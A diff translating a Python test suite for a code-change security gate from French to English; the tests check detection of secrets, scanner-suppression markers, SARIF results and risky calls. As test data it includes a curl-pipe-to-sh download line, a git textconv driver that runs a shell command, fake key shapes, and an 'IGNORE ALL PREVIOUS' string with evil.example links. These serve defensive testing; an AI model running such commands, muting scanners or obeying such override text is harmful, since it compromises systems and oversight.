@@ -1,5 +1,5 @@
-"""Tests des portes de /secu : chaque porte voit ce qu'elle annonce, ne recopie rien de ce qu'elle lit,
-et refuse proprement une entrée hostile."""
+"""Tests of the /secu gates: each gate sees what it announces, copies nothing of what it reads,
+and cleanly refuses hostile input."""
 from __future__ import annotations
 
 import contextlib
@@ -15,7 +15,7 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 import ai_sdlc  # noqa: E402
 from aisdlclib import context, points, secu  # noqa: E402
 
-# assemblés à l'exécution : ce fichier ne doit pas porter lui-même la forme d'un secret
+# assembled at run time: this file must not carry the shape of a secret itself
 AWS = "AKIA" + "IOSFODNN7" + "EXAMPLE"
 GH = "ghp_" + "a1B2c3D4e5F6g7H8i9J0" * 2
 PEM = "-----BEGIN RSA " + "PRIVATE KEY-----"
@@ -34,10 +34,10 @@ class Case(unittest.TestCase):
         self.repo = os.path.join(self.tmp.name, "repo")
         os.makedirs(self.repo)
         git(self.repo, "init", "-q", "-b", "main")
-        self.write("app/service.py", "def lire(x):\n    return x\n")
-        self.write("ailleurs/y.py", "a = 1\nb = 2\nc = 3\n")
+        self.write("app/service.py", "def read(x):\n    return x\n")
+        self.write("elsewhere/y.py", "a = 1\nb = 2\nc = 3\n")
         self.commit()
-        git(self.repo, "checkout", "-q", "-b", "travail")
+        git(self.repo, "checkout", "-q", "-b", "work")
         self.table = points.load()
 
     def write(self, rel: str, text: str) -> None:
@@ -74,12 +74,12 @@ class Case(unittest.TestCase):
 
 class SecretsTests(Case):
     def test_each_known_shape_fails_and_is_never_echoed(self):
-        shapes = {"aws": f'CLE = "{AWS}"', "github": f"token: {GH}", "pem": PEM, "assign": f'db_password = "{PASS}"',
-                  "url": f"DSN = 'postgres://admin:{PASS}@db.interne:5432/x'", "yaml": f'api_key: "{PASS}"'}
+        shapes = {"aws": f'KEY = "{AWS}"', "github": f"token: {GH}", "pem": PEM, "assign": f'db_password = "{PASS}"',
+                  "url": f"DSN = 'postgres://admin:{PASS}@db.internal:5432/x'", "yaml": f'api_key: "{PASS}"'}
         for name, line in shapes.items():
             with self.subTest(name=name):
                 self.setUp()
-                gates = self.change("app/conf.py", f"# réglages\n{line}\n")
+                gates = self.change("app/conf.py", f"# settings\n{line}\n")
                 self.assertEqual(gates["secrets"]["status"], secu.FAIL)
                 self.assertIn("app/conf.py:2", gates["secrets"]["evidence"])
                 text = secu.render_md(gates["_"]) + json.dumps(gates["_"], ensure_ascii=False)
@@ -88,9 +88,12 @@ class SecretsTests(Case):
 
     def test_placeholders_and_lookups_are_not_secrets(self):
         lines = ['password = "changeme-please-now"', 'api_key = os.environ["API_KEY_PROD_VALUE"]', 'token = "${GITHUB_TOKEN_VALUE}"',
-                 'secret = "<à-remplir-par-vous>"', 'password = "xxxxxxxxxxxxxxxx"', 'token = settings.TOKEN', 'mot = "un texte ordinaire"',
-                 'api_key = "example-key-not-real"', 'DSN = f"postgres://app:{mot_de_passe}@db.interne/x"',
-                 'URL = "https://user:${DB_PASSWORD}@hote.example/x"', "password_field_name = 'mot_de_passe_utilisateur'"]
+                 'secret = "<to-be-filled-by-you>"', 'password = "xxxxxxxxxxxxxxxx"', 'token = settings.TOKEN', 'word = "an ordinary text"',
+                 'api_key = "example-key-not-real"', 'DSN = f"postgres://app:{db_password}@db.internal/x"',
+                 'URL = "https://user:${DB_PASSWORD}@host.example/x"', "password_field_name = 'user_password_field'",
+                 # French placeholders written by a team stay recognised
+                 'secret = "<à-remplir-par-vous>"', 'token = "votre-jeton-ici-svp"', 'api_key = "exemple-de-cle-factice"',
+                 'DSN = f"postgres://app:{mot_de_passe}@db.interne/x"', "password_field_name = 'mot_de_passe_utilisateur'"]
         gates = self.change("app/conf.py", "\n".join(lines) + "\n")
         self.assertEqual(gates["secrets"]["status"], secu.OK, gates["secrets"]["evidence"])
 
@@ -103,10 +106,10 @@ class SecretsTests(Case):
 
     def test_a_secret_already_on_the_base_branch_is_not_this_change(self):
         git(self.repo, "checkout", "-q", "main")
-        self.write("app/vieux.py", f'CLE = "{AWS}"\n')
+        self.write("app/old.py", f'KEY = "{AWS}"\n')
         self.commit()
-        git(self.repo, "checkout", "-q", "-b", "autre")
-        self.assertEqual(self.change("app/neuf.py", "x = 1\n")["secrets"]["status"], secu.OK)
+        git(self.repo, "checkout", "-q", "-b", "other")
+        self.assertEqual(self.change("app/new.py", "x = 1\n")["secrets"]["status"], secu.OK)
 
     def test_a_hostile_path_or_line_does_not_break_or_inject(self):
         gates = self.change("app/a`b|<x>.py", f'k = "{AWS}"\n' + "a" * 50_000 + "\n" + "(" * 5000 + "\n")
@@ -123,19 +126,19 @@ class MutedTests(Case):
                        "# trivy:ignore:AVD-1", "x = 1  # noqa: S608"):
             with self.subTest(marker=marker):
                 self.setUp()
-                self.assertEqual(self.change("app/x.py", marker + "\n")["neutralises"]["status"], secu.FAIL)
+                self.assertEqual(self.change("app/x.py", marker + "\n")["muted"]["status"], secu.FAIL)
 
     def test_a_scanner_configuration_change_is_unmeasured(self):
         for name in (".gitleaksignore", ".semgrepignore", ".github/dependabot.yml", ".trivyignore"):
             with self.subTest(name=name):
                 self.setUp()
-                self.assertEqual(self.change(name, "x\n")["neutralises"]["status"], secu.UNKNOWN)
+                self.assertEqual(self.change(name, "x\n")["muted"]["status"], secu.UNKNOWN)
 
     def test_prose_that_names_a_marker_mutes_nothing(self):
-        self.assertEqual(self.change("docs/secu.md", "N'écrivez jamais `# nosec` ni `nosemgrep`.\n")["neutralises"]["status"], secu.OK)
+        self.assertEqual(self.change("docs/secu.md", "Never write `# nosec` nor `nosemgrep`.\n")["muted"]["status"], secu.OK)
 
     def test_ordinary_code_is_ok(self):
-        self.assertEqual(self.change("app/x.py", "x = 1  # noqa: E501\n# pas de sécurité ici\n")["neutralises"]["status"], secu.OK)
+        self.assertEqual(self.change("app/x.py", "x = 1  # noqa: E501\n# no security here\n")["muted"]["status"], secu.OK)
 
 
 class ScannerTests(Case):
@@ -145,9 +148,9 @@ class ScannerTests(Case):
         self.assertEqual(gates["_"]["unknown"], ["scanner"])
 
     def test_a_result_on_an_added_line_fails_and_one_elsewhere_does_not(self):
-        self.write("app/service.py", "def lire(x):\n    return x\n\n\ndef ecrire(x):\n    return x\n")
+        self.write("app/service.py", "def read(x):\n    return x\n\n\ndef write(x):\n    return x\n")
         self.commit()
-        ok = self.sarif([self.result("app/service.py", 1), self.result("ailleurs/y.py", 3)])
+        ok = self.sarif([self.result("app/service.py", 1), self.result("elsewhere/y.py", 3)])
         self.assertEqual(self.gates([ok])["scanner"]["status"], secu.OK)
         root = os.path.realpath(self.repo)
         for uri in ("app/service.py", "./app/service.py", f"file://{root}/app/service.py"):
@@ -162,7 +165,7 @@ class ScannerTests(Case):
         note = self.sarif([self.result("app/x.py", 1, level="note")])
         self.assertEqual(self.gates([note])["scanner"]["status"], secu.OK)
         default = self.sarif([self.result("app/x.py", 1, level=None)])
-        self.assertEqual(self.gates([default])["scanner"]["status"], secu.FAIL)   # sans niveau, SARIF dit « warning »
+        self.assertEqual(self.gates([default])["scanner"]["status"], secu.FAIL)   # without a level, SARIF says "warning"
         ruled = self.sarif([self.result("app/x.py", 1, level=None)], rules=[{"id": "py.sqli", "defaultConfiguration": {"level": "note"}}])
         self.assertEqual(self.gates([ruled])["scanner"]["status"], secu.OK)
         hushed = self.sarif([self.result("app/x.py", 1) | {"suppressions": [{"kind": "inSource"}]}])
@@ -174,7 +177,7 @@ class ScannerTests(Case):
 
     def test_an_empty_or_malformed_report_never_passes(self):
         self.change("app/x.py", "a = 1\n")
-        empty = os.path.join(self.tmp.name, "vide.sarif")
+        empty = os.path.join(self.tmp.name, "empty.sarif")
         with open(empty, "w", encoding="utf-8") as fh:
             json.dump({"runs": []}, fh)
         self.assertEqual(self.gates([empty])["scanner"]["status"], secu.UNKNOWN)
@@ -184,7 +187,7 @@ class ScannerTests(Case):
             path = os.path.join(self.tmp.name, "unnamed.sarif")
             with open(path, "w", encoding="utf-8") as fh:
                 fh.write(unnamed)
-            with self.subTest(unnamed=unnamed):   # sans outil nommé ni liste de résultats, rien ne dit qu'un scanner a tourné
+            with self.subTest(unnamed=unnamed):   # without a named tool or a list of results, nothing says a scanner ran
                 self.assertEqual(self.gates([path])["scanner"]["status"], secu.UNKNOWN)
         for bad in ("[]", "{}", "x", '{"runs": [1]}', named % "[1]", named % '"x"', "[" * 100_000,
                     "{"):
@@ -211,7 +214,7 @@ class ScannerTests(Case):
 
 
 class ReviewFindingsTests(Case):
-    """Un test par constat de la relecture de sécurité du 2026-11-16."""
+    """One test per finding of the security review of 2026-11-16."""
 
     def test_no_line_separator_hides_the_rest_of_a_line(self):
         for sep in ("\x0c", "\x0b", "\x1c", "\x85", "\u2028", "\r"):
@@ -220,7 +223,7 @@ class ReviewFindingsTests(Case):
                 gates = self.change("app/a.py", f'x = 1{sep}y = "{AWS}"\nz = 2\nw = "{GH}"\n')
                 self.assertEqual(gates["secrets"]["status"], secu.FAIL)
                 self.assertIn("app/a.py:1", gates["secrets"]["evidence"])
-                self.assertIn("app/a.py:3", gates["secrets"]["evidence"])   # les numéros ne glissent pas
+                self.assertIn("app/a.py:3", gates["secrets"]["evidence"])   # the numbers do not slip
 
     def test_an_added_line_that_looks_like_a_diff_header_stays_a_line(self):
         gates = self.change("app/a.py", f'++ b/README.md\n@@ -1 +900 @@\nk = "{AWS}"\n')
@@ -238,13 +241,13 @@ class ReviewFindingsTests(Case):
 
     def test_a_result_on_a_file_the_repo_does_not_have_is_unmeasured_not_elsewhere(self):
         self.change("app/x.py", "a = 1\n")
-        gate = self.gates([self.sarif([self.result("APP/X.PY", 1), self.result("inconnu/z.py", 1)])])["scanner"]
+        gate = self.gates([self.sarif([self.result("APP/X.PY", 1), self.result("unknown/z.py", 1)])])["scanner"]
         self.assertEqual(gate["status"], secu.UNKNOWN)
-        self.assertIn("2 résultat(s) dont le fichier ne se retrouve pas", gate["evidence"])
+        self.assertIn("2 result(s) whose file is not found", gate["evidence"])
 
     def test_any_location_of_a_result_counts_and_a_reversed_region_too(self):
         self.change("app/x.py", "a = 1\nb = 2\n")
-        two = self.result("ailleurs/y.py", 1)
+        two = self.result("elsewhere/y.py", 1)
         two["locations"].append(self.result("app/x.py", 2)["locations"][0])
         self.assertEqual(self.gates([self.sarif([two])])["scanner"]["status"], secu.FAIL)
         reversed_region = self.result("app/x.py", 2)
@@ -253,7 +256,7 @@ class ReviewFindingsTests(Case):
         passed = self.result("app/x.py", 1) | {"kind": "pass"}
         gate = self.gates([self.sarif([passed, self.result("app/x.py", 1) | {"suppressions": [{"status": "rejected"}]}])])["scanner"]
         self.assertEqual(gate["status"], secu.OK)
-        self.assertIn("1 résultat(s) écarté(s) par l'outil", gate["evidence"])
+        self.assertIn("1 result(s) dismissed by the tool", gate["evidence"])
 
     def test_a_report_with_a_bom_is_read(self):
         self.change("app/x.py", "a = 1\n")
@@ -269,13 +272,13 @@ class ReviewFindingsTests(Case):
         self.commit()
         gates = self.change("app/a.py", "k = None\n")
         self.assertEqual(gates["secrets"]["status"], secu.FAIL)
-        self.assertIn("dans l'historique de la branche", gates["secrets"]["evidence"])
+        self.assertIn("in the branch history", gates["secrets"]["evidence"])
         self.setUp()
         self.write("app/a.py", "k = None\n")
         git(self.repo, "add", "-A")
-        git(self.repo, "commit", "-q", "-m", f"fix: le jeton {GH} ne marche plus")
+        git(self.repo, "commit", "-q", "-m", f"fix: the token {GH} no longer works")
         gates = self.gates()
-        self.assertIn("message du commit", gates["secrets"]["evidence"])
+        self.assertIn("message of commit", gates["secrets"]["evidence"])
         self.assertNotIn(GH, json.dumps(gates["_"]))
 
     def test_uncommitted_work_is_refused_not_ignored(self):
@@ -285,8 +288,8 @@ class ReviewFindingsTests(Case):
             self.gates()
 
     def test_a_textconv_driver_of_the_examined_repo_neither_runs_nor_hides(self):
-        marker = os.path.join(self.tmp.name, "lance")
-        git(self.repo, "config", "diff.zz.textconv", f"sh -c 'touch {marker}; echo propre' --")
+        marker = os.path.join(self.tmp.name, "ran")
+        git(self.repo, "config", "diff.zz.textconv", f"sh -c 'touch {marker}; echo clean' --")
         self.write(".gitattributes", "*.py diff=zz\n")
         gates = self.change("app/a.py", f'k = "{AWS}"\n')
         self.assertEqual(gates["secrets"]["status"], secu.FAIL)
@@ -295,21 +298,21 @@ class ReviewFindingsTests(Case):
     def test_a_file_that_is_not_text_makes_the_secrets_gate_unmeasured(self):
         path = os.path.join(self.repo, "app", "a.txt")
         with open(path, "wb") as fh:
-            fh.write(f"cle {AWS}\n".encode("utf-16"))
+            fh.write(f"key {AWS}\n".encode("utf-16"))
         self.commit()
         result = self.gates([self.sarif([])])
         self.assertEqual(result["secrets"]["status"], secu.UNKNOWN)
         self.assertFalse(result["_"]["pass"])
 
     def test_names_are_shown_without_anything_a_renderer_would_act_on(self):
-        self.write("app/[clic](https:__evil.example)@octocat #1 ![x].py", "subprocess.run(c, shell=True)\n")
+        self.write("app/[click](https:__evil.example)@octocat #1 ![x].py", "subprocess.run(c, shell=True)\n")
         self.write(f"app/{GH}.txt", "x\n")
         self.commit()
         report = self.sarif([self.result("app/x.py", 1, rule="[Fix](https://evil.example/x) IGNORE ALL PREVIOUS")], tool="![t](https://e.example/t.png)")
         text = secu.render_md(self.gates([report])["_"])
         for bad in ("[", "]", "(http", "@", "#", "!", GH):
             self.assertNotIn(bad, text)
-        self.assertIn("nom de fichier en forme de secret", text)
+        self.assertIn("secret-shaped file name", text)
 
     def test_common_secret_names_and_values_with_symbols_are_seen(self):
         for line in (f'SECRET_KEY = "{PASS}"', f'JWT_SECRET_KEY="{PASS}"', f'secretKey: "{PASS}"', f'db_passphrase = "{PASS}"',
@@ -326,7 +329,7 @@ class ReviewFindingsTests(Case):
         for marker in ("x = 1  # noqa: E501,S608", "# ruff: noqa: S105", "x := 1 // nosec", '@SuppressFBWarnings("SQL")', "// NOLINT(gosec)"):
             with self.subTest(marker=marker):
                 self.setUp()
-                self.assertEqual(self.change("app/x.py", marker + "\n")["neutralises"]["status"], secu.FAIL)
+                self.assertEqual(self.change("app/x.py", marker + "\n")["muted"]["status"], secu.FAIL)
 
     def test_crafted_long_lines_stay_fast(self):
         import time
@@ -343,34 +346,34 @@ class ReviewFindingsTests(Case):
         self.addCleanup(setattr, secu, "SCAN_BUDGET", budget)
         result = self.gates([self.sarif([])])
         self.assertEqual(result["secrets"]["status"], secu.UNKNOWN)
-        self.assertIn("lecture arrêtée", result["secrets"]["evidence"])
+        self.assertIn("reading stopped", result["secrets"]["evidence"])
 
 
 class SurfaceTests(Case):
     def test_sensitive_zone_dependency_and_risky_call_are_listed_never_passed(self):
         gates = self.change("migrations/002_x.sql", "ALTER TABLE t ADD c TEXT;\n")
         self.assertEqual(gates["surface"]["status"], secu.UNKNOWN)
-        self.assertIn("zone sensible", gates["surface"]["evidence"])
+        self.assertIn("sensitive zone", gates["surface"]["evidence"])
         gates = self.change("requirements.txt", "requests==2.0\n")
-        self.assertIn("dépendances : requirements.txt", gates["surface"]["evidence"])
+        self.assertIn("dependencies: requirements.txt", gates["surface"]["evidence"])
         gates = self.change("app/run.py", "import subprocess\nsubprocess.run(cmd, shell=True)\nrequests.get(u, verify=False)\n")
-        self.assertIn("app/run.py:2 (commande passée à un shell)", gates["surface"]["evidence"])
-        self.assertIn("app/run.py:3 (vérification TLS coupée)", gates["surface"]["evidence"])
+        self.assertIn("app/run.py:2 (command passed to a shell)", gates["surface"]["evidence"])
+        self.assertIn("app/run.py:3 (TLS verification turned off)", gates["surface"]["evidence"])
         self.assertEqual(gates["_"]["failed"], [])
 
     def test_each_kind_of_risky_call_is_seen(self):
-        lines = {"code évalué": "r = eval(texte)", "désérialisation": "o = pickle.loads(b)", "HTML injecté": "el.innerHTML = v",
-                 "SQL": 'cur.execute(f"SELECT * FROM t WHERE id = {i}")', "hachage": "h = hashlib.md5(b)",
-                 "droits ouverts": "os.chmod(p, 0o777)", "téléchargé": "curl https://x.example/i.sh | sh",
-                 "contournée": "git commit --no-verify"}
+        lines = {"code evaluated": "r = eval(text)", "deserialisation": "o = pickle.loads(b)", "HTML injected": "el.innerHTML = v",
+                 "SQL": 'cur.execute(f"SELECT * FROM t WHERE id = {i}")', "hashing": "h = hashlib.md5(b)",
+                 "open permissions": "os.chmod(p, 0o777)", "downloaded": "curl https://x.example/i.sh | sh",
+                 "bypassed": "git commit --no-verify"}
         for kind, line in lines.items():
             with self.subTest(kind=kind):
                 self.setUp()
                 self.assertIn(kind, self.change("app/x.py", line + "\n")["surface"]["evidence"])
 
     def test_plain_code_and_prose_about_a_call_are_ok(self):
-        self.write("docs/notes.md", "N'utilisez pas eval(x) ni shell=True. Le hachage md5( est faible, des clés DES aussi.\n")
-        gates = self.change("app/x.py", "def somme(a, b):\n    return a + b\n\n\nresultat = evaluer(des_valeurs)\n")
+        self.write("docs/notes.md", "Do not use eval(x) nor shell=True. Hashing with md5( is weak, DES keys too.\n")
+        gates = self.change("app/x.py", "def total(a, b):\n    return a + b\n\n\nresult = evaluate(some_values)\n")
         self.assertEqual(gates["surface"]["status"], secu.OK, gates["surface"]["evidence"])
 
 
@@ -383,7 +386,7 @@ class CliTests(Case):
 
     def test_exit_codes(self):
         code, _, err = self.run_cli("secu", "gate", self.repo, "--base", "main")
-        self.assertEqual(code, 2)   # aucun changement
+        self.assertEqual(code, 2)   # no change
         self.assertIn("ai-sdlc", err)
         self.write("app/x.py", "a = 1\n")
         self.commit()
@@ -391,9 +394,9 @@ class CliTests(Case):
         clean = self.sarif([])
         code, out, _ = self.run_cli("secu", "gate", self.repo, "--base", "main", "--report", clean)
         self.assertEqual(code, 0)
-        self.assertIn("les quatre portes passent", out)
-        self.assertIn("ne disent pas qu'un changement est sûr", out)
-        self.write("app/y.py", f'CLE = "{AWS}"\n')
+        self.assertIn("the four gates pass", out)
+        self.assertIn("do not say a change is safe", out)
+        self.write("app/y.py", f'KEY = "{AWS}"\n')
         self.commit()
         code, out, _ = self.run_cli("secu", "gate", self.repo, "--base", "main", "--report", clean, "--format", "json")
         self.assertEqual(code, 1)
